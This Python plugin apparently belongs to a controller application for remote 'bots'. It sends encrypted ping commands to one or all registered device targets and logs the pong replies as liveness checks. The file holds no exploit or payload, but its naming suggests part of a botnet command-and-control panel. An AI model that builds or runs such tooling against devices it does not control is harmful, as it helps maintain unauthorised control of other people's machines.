# plugins/ping.py
from .base_plugin import BasePlugin
import ujson as json
import time

# Plugin metadata for the new loader
plugin_info = {
    'name': 'Ping',
    'priority': 0,
    'handled_types': ['pong']
}


class PingPlugin(BasePlugin):
    def __init__(self, parent):
        super().__init__(parent)
        self.name = "Ping"
        self.menu_action = self.name
        self.priority = 0
        self.category = "Bot"
        self.pending_bots = {}

    def execute(self, target):
        try:
            if target == 'all':
                # Use device_model to iterate devices efficiently
                for row in range(self.parent.device_model.device_count()):
                    device = self.parent.device_model.device_at(row)
                    if not device:
                        continue
                    bot_target = device.get('target')
                    if bot_target:
                        self.send_ping(bot_target)
            else:
                self.send_ping(target)
        except Exception as e:
            self.parent.log_buffered(f"Error executing ping: {e}")

    def send_ping(self, target):
        try:
            self.pending_bots[target] = False
            command = {'type': 'command', 'target': target, 'action': 'ping'}
            # Use centralized transport to send commands
            sent = False
            try:
                sent = self.parent.transport.send_command(command, encrypt=True)
            except Exception as e:
                self.parent.log_buffered(f"Transport send error: {e}")
            if sent:
                self.parent.log_buffered(f"Sent encrypted ping command: {command}")
            else:
                self.parent.log_buffered(f"Failed to send ping command: {command}")
        except Exception as e:
            self.parent.log_buffered(f"Error sending ping to {target}: {e}")

    def handle_response(self, data):
        try:
            if data.get('type') == 'pong':
                target = f"{data.get('ip')}:{data.get('id')}"
                if target in self.pending_bots:
                    self.pending_bots[target] = True
                    self.parent.log_buffered(f"Received pong from {target}")
        except Exception as e:
            self.parent.log_buffered(f"Error handling pong response: {e}")